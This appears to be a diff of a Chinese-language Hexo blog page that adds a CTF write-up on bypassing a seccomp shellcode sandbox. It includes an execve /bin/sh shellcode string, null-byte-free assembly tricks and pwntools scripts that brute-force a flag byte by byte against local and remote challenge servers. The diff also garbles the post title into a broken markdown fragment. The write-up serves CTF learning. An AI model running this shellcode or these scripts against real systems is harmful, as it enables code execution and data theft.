@@ -79,14 +79,21 @@
 
 
 
+<meta name="description" content="刚做完了一道题目，是一道shellcode题目，当然，有一定的保护    从以上两张照片可以看到这个题目中给的shellcode的限制 不能出现空字符 关闭了输入流，输出流，以及error 只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关） 任意输入数据，gdb调试一波加上，开始调试   发现有有用的其实也就上面的图，读取/flag文件之后把内容读取到了rdi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="seccomp_flag&#39;s爆破">
+<meta property="og:title" content="seccompmp_flag&#39; ![buf](seccomp-flag-s爆破\buf.PNG)">
 <meta property="og:url" content="https://ppcrab.github.io/2019/07/22/seccomp-flag-s爆破/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="刚做完了一道题目，是一道shellcode题目，当然，有一定的保护    从以上两张照片可以看到这个题目中给的shellcode的限制 不能出现空字符 关闭了输入流，输出流，以及error 只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关） 任意输入数据，gdb调试一波加上，开始调试   发现有有用的其实也就上面的图，读取/flag文件之后把内容读取到了rdi">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-07-22T06:01:15.685Z">
+<meta property="og:image" content="https://ppcrab.github.io/2019/07/22/seccomp-flag-s爆破/buf.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/07/22/seccomp-flag-s爆破/protect.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/07/22/seccomp-flag-s爆破/bendiflag.PNG">
+<meta property="og:updated_time" content="2019-07-22T08:03:32.788Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="seccomp_flag&#39;s爆破">
+<meta name="twitter:title" content="seccompmp_flag&#39; ![buf](seccomp-flag-s爆破\buf.PNG)">
+<meta name="twitter:description" content="刚做完了一道题目，是一道shellcode题目，当然，有一定的保护    从以上两张照片可以看到这个题目中给的shellcode的限制 不能出现空字符 关闭了输入流，输出流，以及error 只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关） 任意输入数据，gdb调试一波加上，开始调试   发现有有用的其实也就上面的图，读取/flag文件之后把内容读取到了rdi">
+<meta name="twitter:image" content="https://ppcrab.github.io/2019/07/22/seccomp-flag-s爆破/buf.PNG">
 
 
 
@@ -122,7 +129,7 @@
 
 
 
-  <title>seccomp_flag's爆破 | Hexo</title>
+  <title>seccompmp_flag' ![buf](seccomp-flag-s爆破\buf.PNG) | Hexo</title>
   
 
 
@@ -278,7 +285,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">seccomp_flag's爆破</h1>
+          <h1 class="post-title" itemprop="name headline">seccompmp_flag' ![buf](seccomp-flag-s爆破\buf.PNG)</h1>
         
 
         <div class="post-meta">
@@ -290,7 +297,7 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-22T14:01:15+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-22T13:58:48+08:00">
                 2019-07-22
               </time>
             
@@ -322,7 +329,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  0
+                  861
                 </span>
               
 
@@ -338,7 +345,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  1
+                  3
                 </span>
               
             </div>
@@ -359,7 +366,39 @@
       
 
       
-        
+        <p>刚做完了一道题目，是一道shellcode题目，当然，有一定的保护 <img src="/2019/07/22/seccomp-flag-s爆破/buf.PNG" alt="buf"></p>
+<p> <img src="/2019/07/22/seccomp-flag-s爆破/protect.PNG" alt="protect"></p>
+<p>从以上两张照片可以看到这个题目中给的shellcode的限制</p>
+<p>不能出现空字符</p>
+<p>关闭了输入流，输出流，以及error</p>
+<p>只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）</p>
+<h4 id="任意输入数据，gdb调试一波"><a href="#任意输入数据，gdb调试一波" class="headerlink" title="任意输入数据，gdb调试一波"></a>任意输入数据，gdb调试一波</h4><p>加上，开始调试</p>
+<p> <img src="/2019/07/22/seccomp-flag-s爆破/bendiflag.PNG" alt="bendiflag"></p>
+<p>发现有有用的其实也就上面的图，读取/flag文件之后把内容读取到了rdi，rdx寄存器中。so，我们的shellcode 好写一点了。</p>
+<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><p>长度&lt;=200</p>
+<p>我最常用的无任何限制的shellcode的长度是0x18</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</span><br></pre></td></tr></table></figure>
+<p>即使是随便其他的shellcode，也比200小得多，所以这个限制没什么</p>
+<h4 id="关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）"><a href="#关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）" class="headerlink" title="关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）"></a>关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）</h4><p>md，本来我是不知道close(0),close(1),close(2).所以我想的是既然开了write，还有rdi,rdx寄存器里存着，直接write读取不就完了。只要想着绕开空字符限制就好了。然而失败了。卡了好大阵子后。。终于发现read，close还是不能用。。。。我哭了</p>
+<h4 id="无空字符限制"><a href="#无空字符限制" class="headerlink" title="无空字符限制"></a>无空字符限制</h4><p>本来解决这个限制的原因是使用write系统调用，虽然write调用没用，但是解决方法倒是找到了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax,0x3c999999</span><br><span class="line">shr rax,24</span><br></pre></td></tr></table></figure>
+<p>使用这种方法，很轻松的就可以讲想要的寄存器放入任意的数值，而且，不需要担心空字节问题，我tql</p>
+<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>最终，找到了方法，爆破，我只需要编写类似的语句就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if flag[i] == flag_byte:</span><br><span class="line">	i++</span><br><span class="line">else:</span><br><span class="line">	flag_byte++</span><br></pre></td></tr></table></figure>
+<p>emmm</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov sil,byte ptr[rdx+&apos;&apos;&apos;+str(i)+&apos;&apos;&apos;]</span><br><span class="line">mov dil,&apos;&apos;&apos;+hex(flag_byte)+&apos;&apos;&apos;</span><br><span class="line">cmp sil,dil</span><br><span class="line">je right</span><br><span class="line">mov rax,0x11999999</span><br><span class="line">syscall</span><br><span class="line">right:</span><br><span class="line">mov rax,0x3c999999</span><br><span class="line">shr rax,24</span><br><span class="line">xor rdi,rdi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">xor rsi,rsi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>只需要让他在失败的时候调用无法无法运行的语句，成功的时候正常退出就好了。完美</p>
+<h4 id="然而"><a href="#然而" class="headerlink" title="然而"></a>然而</h4><p>本地跑和远程居然不一样！</p>
+<p>我本地得到的反馈是，如果正常退出</p>
+<p>会有exit 0这样子的输出</p>
+<p>我就用pwntools里的p.poll来判断</p>
+<p>但是远程不行。。幸亏有反馈</p>
+<p>so，本地脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> flag_byte <span class="keyword">in</span> xrange(<span class="number">105</span>,<span class="number">107</span>): </span><br><span class="line">	p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">	<span class="comment">#p = remote('pwn1.blue-whale.me',19910)</span></span><br><span class="line">	p.recvuntil(<span class="string">'vehicle\n'</span>)</span><br><span class="line">	<span class="comment">#the flag was stored in rdx and rdi</span></span><br><span class="line">	shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov sil,byte ptr[rdx+'''</span>+str(i)+<span class="string">''']</span></span><br><span class="line"><span class="string">	mov dil,'''</span>+hex(flag_byte)+<span class="string">'''</span></span><br><span class="line"><span class="string">	cmp sil,dil</span></span><br><span class="line"><span class="string">	je right</span></span><br><span class="line"><span class="string">	mov rax,0x11999999</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	right:</span></span><br><span class="line"><span class="string">	mov rax,0x3c999999</span></span><br><span class="line"><span class="string">	shr rax,24</span></span><br><span class="line"><span class="string">	xor rdi,rdi</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	)</span><br><span class="line">	p.sendline(shellcode)</span><br><span class="line">	<span class="keyword">if</span> p.poll()!=<span class="number">0</span>:</span><br><span class="line">	    p.close()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">	    flag += chr(flag_byte)</span><br><span class="line">	    log.success(flag)</span><br></pre></td></tr></table></figure>
+<p>远程脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment">#flag = "ctf&#123;1eak1ng_0n1y_One_biT_is_impor7anT_To_The_security_of_2"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> flag_byte <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>): </span><br><span class="line">	<span class="comment">#p = process('./pwn')</span></span><br><span class="line">	p = remote(<span class="string">'pwn2.blue-whale.me'</span>,<span class="number">19910</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'vehicle\n'</span>)</span><br><span class="line">	<span class="comment">#the flag was stored in rdx and rdi</span></span><br><span class="line">	shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov sil,byte ptr[rdx+'''</span>+str(i)+<span class="string">''']</span></span><br><span class="line"><span class="string">	mov dil,'''</span>+hex(flag_byte)+<span class="string">'''</span></span><br><span class="line"><span class="string">	cmp sil,dil</span></span><br><span class="line"><span class="string">	je right</span></span><br><span class="line"><span class="string">	mov rax,0x11999999</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	right:</span></span><br><span class="line"><span class="string">	mov rax,0x3c999999</span></span><br><span class="line"><span class="string">	shr rax,24</span></span><br><span class="line"><span class="string">	xor rdi,rdi</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	xor rsi,rsi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	)</span><br><span class="line">	p.sendline(shellcode)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p.recv(timeout =<span class="number">0.5</span>)</span><br><span class="line">		p.close()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		flag += chr(flag_byte)</span><br><span class="line">	    	log.success(flag)</span><br></pre></td></tr></table></figure>
+<h4 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h4><p>在题目复现的时候会发现，seccomp的使用，使得直接进行gdb调试是可行的，但是使用pwntools进行attach调试会失败。</p>
+
       
     </div>
     
@@ -383,8 +422,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/22/seccompmp-flag-s爆破/" rel="next" title="seccompmp_flag' ![buf](seccomp-flag-s爆破\buf.PNG)">
-                <i class="fa fa-chevron-left"></i> seccompmp_flag' ![buf](seccomp-flag-s爆破\buf.PNG)
+              <a href="/2019/07/17/rop书写的几种形式/" rel="next" title="rop书写的几种形式">
+                <i class="fa fa-chevron-left"></i> rop书写的几种形式
               </a>
             
           </div>
@@ -443,8 +482,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -463,7 +511,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -515,6 +563,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#任意输入数据，gdb调试一波"><span class="nav-number">1.</span> <span class="nav-text">任意输入数据，gdb调试一波</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#长度限制"><span class="nav-number">2.</span> <span class="nav-text">长度限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）"><span class="nav-number">3.</span> <span class="nav-text">关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#无空字符限制"><span class="nav-number">4.</span> <span class="nav-text">无空字符限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆破"><span class="nav-number">5.</span> <span class="nav-text">爆破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#然而"><span class="nav-number">6.</span> <span class="nav-text">然而</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Other"><span class="nav-number">7.</span> <span class="nav-text">Other</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
